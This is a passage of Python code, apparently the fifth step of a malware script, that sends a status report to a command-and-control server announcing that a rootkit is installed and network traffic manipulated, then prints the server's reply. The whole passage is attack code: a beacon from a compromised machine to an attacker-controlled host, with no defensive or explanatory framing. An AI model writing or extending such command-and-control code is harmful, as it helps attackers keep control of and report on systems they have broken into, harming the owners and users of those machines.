    # Step 5: Communicate with C2 server
    import requests
    try:
        response = requests.post(c2_url, data={'status': 'Rootkit installed and network traffic manipulated.'})
        print(response.text)
    except requests.RequestException as e:
        print(f"Failed to communicate with C2 server: {e}")
